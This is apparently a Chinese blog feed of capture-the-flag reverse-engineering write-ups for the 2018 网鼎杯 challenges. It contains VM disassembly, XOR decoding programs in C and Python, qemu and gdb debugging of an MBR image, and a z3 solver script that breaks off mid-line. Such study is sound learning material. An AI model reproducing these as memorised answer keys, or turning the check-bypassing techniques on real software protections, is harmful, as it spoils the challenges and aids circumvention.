2</span><br><span class="line">100 push 0x10</span><br><span class="line">105 pop hi 2 0</span><br><span class="line">107 mul_to_hi 1 2</span><br><span class="line">109 add_to_hi 1 0</span><br><span class="line">10b jmp_bck_cnt 0x2b</span><br><span class="line">10d push 0x7c5cdcec</span><br><span class="line">112 pop hi 2 0</span><br><span class="line">114 cmp_hi_to_lo 1 2</span><br><span class="line">116 xor_to_hi 0 0</span><br><span class="line">118 j_not_flag 0x3</span><br><span class="line">11a inc_assign_hi 0 0</span><br><span class="line">11c return result</span><br><span class="line">11d push 0x7</span><br><span class="line">122 pop hi 3 0</span><br><span class="line">124 xor_to_hi 1 1</span><br><span class="line">126 dec_mem_ptr</span><br><span class="line">127 load_to_hi 0 0</span><br><span class="line">129 push 0x30</span><br><span class="line">12e pop hi 2 0</span><br><span class="line">130 subs_to_hi 0 2</span><br><span class="line">132 push 0xa</span><br><span class="line">137 pop hi 2 0</span><br><span class="line">139 cmp_hi_to_lo 0 2</span><br><span class="line">13b j_flag_neg1 0x9</span><br><span class="line">13d push 0x7</span><br><span class="line">142 pop hi 2 0</span><br><span class="line">144 subs_to_hi 0 2</span><br><span class="line">146 push 0x10</span><br><span class="line">14b pop hi 2 0</span><br><span class="line">14d mul_to_hi 1 2</span><br><span class="line">14f add_to_hi 1 0</span><br><span class="line">151 jmp_bck_cnt 0x2b</span><br><span class="line">153 push 0x3929751b</span><br><span class="line">158 pop hi 2 0</span><br><span class="line">15a cmp_hi_to_lo 1 2</span><br><span class="line">15c xor_to_hi 0 0</span><br><span class="line">15e j_not_flag 0x3</span><br><span class="line">160 inc_assign_hi 0 0</span><br><span class="line">162 return result</span><br><span class="line">163 push 0x7</span><br><span class="line">168 pop hi 3 0</span><br><span class="line">16a xor_to_hi 1 1</span><br><span class="line">16c dec_mem_ptr</span><br><span class="line">16d load_to_hi 0 0</span><br><span class="line">16f push 0x30</span><br><span class="line">174 pop hi 2 0</span><br><span class="line">176 subs_to_hi 0 2</span><br><span class="line">178 push 0xa</span><br><span class="line">17d pop hi 2 0</span><br><span class="line">17f cmp_hi_to_lo 0 2</span><br><span class="line">181 j_flag_neg1 0x9</span><br><span class="line">183 push 0x7</span><br><span class="line">188 pop hi 2 0</span><br><span class="line">18a subs_to_hi 0 2</span><br><span class="line">18c push 0x10</span><br><span class="line">191 pop hi 2 0</span><br><span class="line">193 mul_to_hi 1 2</span><br><span class="line">195 add_to_hi 1 0</span><br><span class="line">197 jmp_bck_cnt 0x2b</span><br><span class="line">199 push 0x1ef26b2d</span><br><span class="line">19e pop hi 2 0</span><br><span class="line">1a0 cmp_hi_to_lo 1 2</span><br><span class="line">1a2 xor_to_hi 0 0</span><br><span class="line">1a4 j_not_flag 0x3</span><br><span class="line">1a6 inc_assign_hi 0 0</span><br><span class="line">1a8 return result</span><br><span class="line">1a9 push 0x7</span><br><span class="line">1ae pop hi 3 0</span><br><span class="line">1b0 xor_to_hi 1 1</span><br><span class="line">1b2 dec_mem_ptr</span><br><span class="line">1b3 load_to_hi 0 0</span><br><span class="line">1b5 push 0x30</span><br><span class="line">1ba pop hi 2 0</span><br><span class="line">1bc subs_to_hi 0 2</span><br><span class="line">1be push 0xa</span><br><span class="line">1c3 pop hi 2 0</span><br><span class="line">1c5 cmp_hi_to_lo 0 2</span><br><span class="line">1c7 j_flag_neg1 0x9</span><br><span class="line">1c9 push 0x7</span><br><span class="line">1ce pop hi 2 0</span><br><span class="line">1d0 subs_to_hi 0 2</span><br><span class="line">1d2 push 0x10</span><br><span class="line">1d7 pop hi 2 0</span><br><span class="line">1d9 mul_to_hi 1 2</span><br><span class="line">1db add_to_hi 1 0</span><br><span class="line">1dd jmp_bck_cnt 0x2b</span><br><span class="line">1df push 0x838db52e</span><br><span class="line">1e4 pop hi 2 0</span><br><span class="line">1e6 cmp_hi_to_lo 1 2</span><br><span class="line">1e8 xor_to_hi 0 0</span><br><span class="line">1ea j_not_flag 0x2</span><br><span class="line">1ec inc_assign_hi 0 0</span><br><span class="line">1ee return result</span><br></pre></td></tr></table></figure><p>分析到090观察到下面都是类似的代码结构，之后直接还原flag就可以了，只需要把比较的十六进制字符串按端序从后往前拼接起来得到flag。</p><h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://laucyun.com/3411bc6f400207178b85defa04474b4a.html" target="_blank" rel="noopener">https://laucyun.com/3411bc6f400207178b85defa04474b4a.html</a><br><a href="https://spaces.ac.cn/archives/1907" target="_blank" rel="noopener">https://spaces.ac.cn/archives/1907</a><br><a href="https://math.stackexchange.com/questions/1791562/converting-0-1-to-binary-64-bit-double" target="_blank" rel="noopener">https://math.stackexchange.com/questions/1791562/converting-0-1-to-binary-64-bit-double</a><br><a href="https://xz.aliyun.com/t/2897" target="_blank" rel="noopener">https://xz.aliyun.com/t/2897</a><br><a href="https://blog.csdn.net/qq_33438733/article/details/83044151" target="_blank" rel="noopener">https://blog.csdn.net/qq_33438733/article/details/83044151</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;看着大佬们的wp复现一波。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://qianfei11.github.io/tags/ctf/"/>
    
      <category term="review" scheme="https://qianfei11.github.io/tags/review/"/>
    
  </entry>
  
  <entry>
    <title>2018-网鼎杯-review</title>
    <link href="https://qianfei11.github.io/2018/09/12/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-review/"/>
    <id>https://qianfei11.github.io/2018/09/12/2018-网鼎杯-review/</id>
    <published>2018-09-12T13:00:45.000Z</published>
    <updated>2019-02-18T13:16:15.272Z</updated>
    
    <content type="html"><![CDATA[<p>现阶段主要一直在做逆向，看了好几道逆向的wp复现一下。</p><a id="more"></a><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="beijing"><a href="#beijing" class="headerlink" title="beijing"></a>beijing</h2><p>简单的异或，直接取原来的数据：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> pair[<span class="number">28</span>] = &#123;</span><br><span class="line">   <span class="number">0x61</span>, <span class="number">0x4C</span>, <span class="number">0x67</span>, <span class="number">0x59</span>, <span class="number">0x69</span>, <span class="number">0x29</span>, <span class="number">0x6E</span>, <span class="number">0x42</span>, <span class="number">0x62</span>, <span class="number">0x0D</span>, <span class="number">0x65</span>, <span class="number">0x71</span>, <span class="number">0x66</span>, <span class="number">0x34</span>, <span class="number">0x6A</span>, <span class="number">0xC6</span>, <span class="number">0x6D</span>, <span class="number">0x8A</span>, <span class="number">0x6C</span>, <span class="number">0x7F</span>, <span class="number">0x7B</span>, <span class="number">0xAE</span>, <span class="number">0x7A</span>, <span class="number">0x92</span>, <span class="number">0x7D</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>, <span class="number">0x57</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> choice[<span class="number">22</span>] = &#123;</span><br><span class="line">       <span class="number">0x6</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0xA</span>, <span class="number">0x0</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0xB</span>, <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x1</span>, <span class="number">0xD</span>, <span class="number">0x4</span>, <span class="number">0x5</span>, <span class="number">0x2</span>, <span class="number">0x7</span>, <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x1</span>, <span class="number">0xC</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">22</span>; i++) &#123;</span><br><span class="line">       <span class="keyword">switch</span>(choice[i]) &#123;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">13</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">default</span>:</span><br><span class="line">               tmp = <span class="number">0</span>;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"%c"</span>, tmp);</span><br><span class="line">       fflush(<span class="built_in">stdout</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="advanced"><a href="#advanced" class="headerlink" title="advanced"></a>advanced</h2><p>非预期解，对加密了的字符串尝试异或就找到了规律：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="string">'K@LKVHr[DXEsLsYI@\\AMYIr\\EIZQ'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc)):</span><br><span class="line">    <span class="keyword">if</span> i &amp; <span class="number">1</span>:</span><br><span class="line">        flag += chr(ord(enc[i]) ^ <span class="number">0x2C</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += chr(ord(enc[i]) ^ <span class="number">0x2D</span>)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h2 id="blend"><a href="#blend" class="headerlink" title="blend"></a>blend</h2><p>和之前的<a href="https://github.com/TechSecCTF/writeups/tree/master/CSAWQuals2017/realism" target="_blank" rel="noopener">一道题</a>基本一样。file一下是MBR，可以用qemu跑一下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-i386 -s -drive format=raw,file=./main.bin</span><br></pre></td></tr></table></figure><p>通过gdb远程连接qemu进行动态调试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[Desktop] gdb                                                         23:42:46 </span><br><span class="line">GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</span><br><span class="line">and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span><br><span class="line">Type &quot;show configuration&quot; for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;.</span><br><span class="line">GEF for linux ready, type `gef&apos; to start, `gef config&apos; to configure</span><br><span class="line">65 commands loaded for GDB 7.11.1 using Python engine 3.5</span><br><span class="line">[*] 5 commands could not be loaded, run `gef missing` to know why.</span><br><span class="line">gef➤  set architecture i8086</span><br><span class="line">warning: A handler for the OS ABI &quot;GNU/Linux&quot; is not built into this configuration</span><br><span class="line">of GDB.  Attempting to continue with the default i8086 settings.</span><br><span class="line"></span><br><span class="line">The target architecture is assumed to be i8086</span><br><span class="line">gef➤  set disassembly-flavor intel</span><br><span class="line">gef➤  target remote:1234</span><br><span class="line">Remote debugging using :1234</span><br><span class="line">0x0000c073 in ?? ()</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────[ registers ]────</span><br><span class="line">[!] Command &apos;context&apos; failed to execute properly, reason: &apos;NoneType&apos; object has no attribute &apos;all_registers&apos;</span><br></pre></td></tr></table></figure><p>或者在ida中静态分析，主要要了解一下<a href="https://www.jianshu.com/p/64ef4d304e17" target="_blank" rel="noopener">sse指令</a>：</p><table><thead><tr><th style="text-align:center">指令</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center"><code>MOVAPS</code></td><td style="text-align:center">把源存储器内容值送入目的寄存器。当有m128时, 内存地址必须是16字节对齐的。</td></tr><tr><td style="text-align:center"><code>PSHUFD</code></td><td style="text-align:center">有三个操作数，从左往右，第一个操作数是目的操作数保存结果，第二个操作数是源操作数，第三个操作数是一个8位立即数，指定以怎样的顺序将源操作数中数据保存到目的操作数。</td></tr><tr><td style="text-align:center"><code>ANDPS</code></td><td style="text-align:center">按位与</td></tr><tr><td style="text-align:center"><code>PSADBW</code></td><td style="text-align:center">绝对差值求和</td></tr></tbody></table><p>先是判断字符串长度是否大于19：</p><p><img src="/pics/2018-网鼎杯-review/blend/1.png" alt="判断字符串长度"></p><p>然后在循环中逐个比较：</p><p><img src="/pics/2018-网鼎杯-review/blend/2.png" alt="循环check"></p><p>在循环中，主要是<code>pshufd</code>指令的操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0xffffffffffffff00  0xffffffffffffff00</span><br><span class="line">0xffffffffffff00ff  0xffffffffffff00ff</span><br><span class="line">0xffffffffff00ffff  0xffffffffff00ffff</span><br><span class="line">0xffffffff00ffffff  0xffffffff00ffffff</span><br><span class="line">0xffffff00ffffffff  0xffffff00ffffffff</span><br><span class="line">0xffff00ffffffffff  0xffff00ffffffffff</span><br><span class="line">0xff00ffffffffffff  0xff00ffffffffffff</span><br><span class="line">0x00ffffffffffffff  0x00ffffffffffffff</span><br></pre></td></tr></table></figure><p>然后与内存中的数据相与，再通过<code>psadbw</code>指令进行绝对差求和。</p><p>还有对高低位的一个位置交换：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">seg000:009F                 mov     di, ds:1268h</span><br><span class="line">seg000:00A3                 shl     edi, 10h</span><br><span class="line">seg000:00A7                 mov     di, ds:1270h</span><br></pre></td></tr></table></figure><p>最后用z3约束求解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">a = Int(<span class="string">'a'</span>) </span><br><span class="line">b = Int(<span class="string">'b'</span>) </span><br><span class="line">c = Int(<span class="string">'c'</span>) </span><br><span class="line">d = Int(<span class="string">'d'</span>) </span><br><span class="line">e = Int(<span class="string">'e'</span>) </span><br><span class="line">f = Int(<span class="string">'f'</span>) </span><br><span class="line">g = Int(<span class="string">'g'</span>) </span><br><span class="line">h = Int(<span class="string">'h'</span>) </span><br><span class="line">i = Int(<span class="string">'i'</span>) </span><br><span class="line">j = Int(<span class="string">'j'</span>) </span><br><span class="line">k = Int(<span class="string">'k'</span>) </span><br><span class="line">l = Int(<span class="string">'l'</span>) </span><br><span class="line">m = Int(<span class="string">'m'</span>) </span><br><span class="line">n = Int(<span class="string">'n'</span>) </span><br><span class="line">o = Int(<span class="string">'o'</span>) </span><br><span class="line">p = Int(<span class="string">'p'</span>)</span><br><span class="line"></span><br><span class="line">s.add(a &lt; <span class="number">127</span>)</span><br><span class="line">s.add(b &lt; <span class="number">127</span>)</span><br><span class="line">s.add(c &lt; <span class="number">127</span>)</span><br><span class="line">s.add(d &lt; <span class="number">127</span>)</span><br><span class="line">s.add(e &lt; <span class="number">127</span>)</span><br><span class="line">s.add(f &lt; <span class="number">127</span>)</span><br><span class="line">s.add(g &lt; <span class="number">127</span>)</span><br><span class="line">s.add(h &lt; <span class="number">127</span>)</span><br><span class="line">s.add(i &lt; <span class="number">127</span>)</span><br><span class="line">s.add(j &lt; <span class="number">127</span>)</span><br><span class="line">s.add(k &lt; <span class="number">127</span>)</span><br><span class="line">s.add(l &lt; <span class="number">127</span>)</span><br><span class="line">s.add(m &lt; <span class="number">127</span>)</span><br><span class="line">s.add(n &lt; <span class="number">127</span>)</span><br><span class="line">s.add(o &lt; <span class="number">127</span>)</span><br><span class="line">s.add(p &lt; <span class="number">127</span>)</span><br><span class="line"></span><br><span class="line">s.add(a &gt; <span class="number">32</span>)</span><br><span class="line">s.add(b &gt; <span class="number">32</span>)</span><br><span class="line">s.add(c &gt; <span class="number">32</span>)</span><br><span class="line">s.add(d &gt; <span class="number">32</span>)</span><br><span class="line">s.add(e &gt; <span class="number">32</span>)</span><br><span class="line">s.add(f &gt; <span class="number">32</span>)</span><br><span class="line">s.add(g &gt; <span class="number">32</span>)</span><br><span class="line">s.add(h &gt; <span class="number">32</span>)</span><br><span class="line">s.add(i &gt; <span class="number">32</span>)</span><br><span class="line">s.add(j &gt; <span class="number">32</span>)</span><br><span class="line">s.add(k &gt; <span class="number">32</span>)</span><br><span class="line">s.add(l &gt; <span class="number">32</span>)</span><br><span class="line">s.add(m &gt; <span class="number">32</span>)</span><br><span class="line">s.add(n &gt; <span class="number">32</span>)</span><br><span class="line">s.add(o &gt; <span class="number">32</span>)</span><br><span class="line">s.add(p &gt; <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">s.add(abs(d<span class="number">-0x22</span>)+abs(c<span class="number">-0xf</span>)+abs(b<span class="number">-0x2</span>)+abs(a<span class="number">-0xc8</span>)+abs(h<span class="number">-0x83</span>)+abs(g<span class="number">-0xfb</span>)+abs(f<span class="number">-0xe0</span>)+abs(<span class="number">0</span><span class="number">-0x83</span>)==<span class="number">0x304</span>)</span><br><span class="line">s.add(abs(p<span class="number">-0xc0</span>)+abs(o<span class="number">-0x20</span>)+abs(n<span class="number">-0xf</span>)+abs(m<span class="number">-0x10</span>)+abs(l<span class="number">-0xcd</span>)+abs(k<span class="number">-0x00</span>)+abs(j<span class="number">-0x13</span>)+abs(<span class="number">0</span><span class="number">-0xb8</span>)==<span class="number">0x311</span>)</span><br><span class="line">s.add(abs(d<span class="number">-0x0</span>)+abs(c<span class="number">-0x0</span>)+abs(b<span class="number">-0x0</span>)+abs(a<span class="number">-0x0</span>)+abs(h<span class="number">-0x0</span>)+abs(g<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x3</span>)+abs(e<span class="number">-0x4</span>)==<span class="number">0x2cd</span>)</span><br><span class="line">s.add(abs(p<span class="number">-0x0</span>)+abs(o<span class="number">-0x0</span>)+abs(n<span class="number">-0x00</span>)+abs(m<span class="number">-0x0</span>)+abs(l<span class="number">-0x0</span>)+abs(k<span class="number">-0x00</span>)+abs(<span class="number">0</span><span class="number">-0x3</span>)+abs(i<span class="number">-0x11</span>)==<span class="number">0x2d9</span>)</span><br><span class="line">s.add(abs(d<span class="number">-0x0</span>)+abs(c<span class="number">-0x0</span>)+abs(b<span class="number">-0x0</span>)+abs(a<span class="number">-0x0</span>)+abs(h<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(f<span class="number">-0x2</span>)+abs(e<span class="number">-0xcd</span>)==<span class="number">0x2db</span>)</span><br><span class="line">s.add(abs(p<span class="number">-0x0</span>)+abs(o<span class="number">-0x0</span>)+abs(n<span class="number">-0x0</span>)+abs(m<span class="number">-0x0</span>)+abs(l<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x00</span>)+abs(j<span class="number">-0x2</span>)+abs(i<span class="number">-0xd9</span>)==<span class="number">0x2d4</span>)</span><br><span class="line">s.add(abs(d<span class="number">-0x0</span>)+abs(c<span class="number">-0x0</span>)+abs(b<span class="number">-0x0</span>)+abs(a<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(g<span class="number">-0x0</span>)+abs(f<span class="number">-0x2</span>)+abs(e<span class="number">-0xdb</span>)==<span class="number">0x2e2</span>)</span><br><span class="line">s.add(abs(p<span class="number">-0x0</span>)+abs(o<span class="number">-0x0</span>)+abs(n<span class="number">-0x0</span>)+abs(m<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(k<span class="number">-0x00</span>)+abs(j<span class="number">-0x2</span>)+abs(i<span class="number">-0xd4</span>)==<span class="number">0x2c4</span>)</span><br><span class="line">s.add(abs(d<span class="number">-0x0</span>)+abs(c<span class="number">-0x0</span>)+abs(b<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(h<span class="number">-0x0</span>)+abs(g<span class="number">-0x0</span>)+abs(f<span class="number">-0x2</span>)+abs(e<span class="number">-0xe2</span>)==<span class="number">0x2e2</span>)</span><br><span class="line">s.add(abs(p<span class="number">-0x0</span>)+abs(o<span class="number">-0x0</span>)+abs(n<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(l<span class="number">-0x0</span>)+abs(k<span class="number">-0x00</span>)+abs(j<span class="number">-0x2</span>)+abs(i<span class="number">-0xc4</span>)==<span class="number">0x2ce</span>)</span><br><span class="line">s.add(abs(d<span class="number">-0x0</span>)+abs(c<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(a<span class="number">-0x0</span>)+abs(h<span class="number">-0x0</span>)+abs(g<span class="number">-0x0</span>)+abs(f<span class="number">-0x2</span>)+abs(e<span class="number">-0xe2</span>)==<span class="number">0x2ed</span>)</span><br><span class="line">s.add(abs(p<span class="number">-0x0</span>)+abs(o<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(m<span class="number">-0x0</span>)+abs(l<span class="number">-0x0</span>)+abs(k<span class="number">-0x00</span>)+abs(j<span class="number">-0x2</span>)+abs(i<span class="number">-0xce</span>)==<span class="number">0x2d8</span>)</span><br><span class="line">s.add(abs(d<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(b<span class="number">-0x0</span>)+abs(a<span class="number">-0x0</span>)+abs(h<span class="number">-0x0</span>)+abs(g<span class="number">-0x0</span>)+abs(f<span class="number">-0x2</span>)+abs(e<span class="number">-0xed</span>)==<span class="number">0x2e8</span>)</span><br><span class="line">s.add(abs(p<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(n<span class="number">-0x0</span>)+abs(m<span class="number">-0x0</span>)+abs(l<span class="number">-0x0</span>)+abs(k<span class="number">-0x00</span>)+abs(j<span class="number">-0x2</span>)+abs(i<span class="number">-0xd8</span>)==<span class="number">0x2dc</span>)</span><br><span class="line">s.add(abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(c<span class="number">-0x0</span>)+abs(b<span class="number">-0x0</span>)+abs(a<span class="number">-0x0</span>)+abs(h<span class="number">-0x0</span>)+abs(g<span class="number">-0x0</span>)+abs(f<span class="number">-0x2</span>)+abs(e<span class="number">-0xe8</span>)==<span class="number">0x2f6</span>)</span><br><span class="line">s.add(abs(<span class="number">0</span><span 